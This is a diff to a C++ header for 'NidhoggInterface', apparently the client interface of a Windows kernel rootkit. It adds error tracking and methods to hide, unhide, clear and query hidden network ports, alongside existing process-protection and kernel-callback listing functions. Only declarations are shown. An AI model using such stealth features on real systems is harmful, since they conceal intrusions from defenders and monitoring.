@@ -20,6 +20,7 @@ constexpr const wchar_t* HKCR_SHORT = L"HKCR";
 class NidhoggInterface {
 private:
 	HANDLE hNidhogg;
+	NidhoggErrorCodes lastError;
 
 	std::wstring GetHKCUPath();
 	std::wstring ParseRegistryKey(wchar_t* key);
@@ -28,7 +29,8 @@ private:
 public:
 	NidhoggInterface();
 	~NidhoggInterface() { CloseHandle(this->hNidhogg); };
-	bool IsValid() { return  this->hNidhogg != INVALID_HANDLE_VALUE; };
+	bool IsValid() { return this->hNidhogg != INVALID_HANDLE_VALUE; }
+	NidhoggErrorCodes GetNidhoggLastError() { return this->lastError; }
 
 	void PrintError(NidhoggErrorCodes errorCode);
 	NidhoggErrorCodes ProcessProtect(DWORD pid);
@@ -77,4 +79,8 @@ public:
 	CmCallbacksList ListRegistryCallbacks(NidhoggErrorCodes* success);
 	PsRoutinesList ListPsRoutines(CallbackType callbackType, NidhoggErrorCodes* success);
 	ObCallbacksList ListObCallbacks(CallbackType callbackType, NidhoggErrorCodes* success);
+	NidhoggErrorCodes HidePort(USHORT portNumber, PortType portType, bool remote);
+	NidhoggErrorCodes UnhidePort(USHORT portNumber, PortType portType, bool remote);
+	NidhoggErrorCodes ClearHiddenPorts();
+	std::vector<HiddenPort> QueryHiddenPorts();
 };
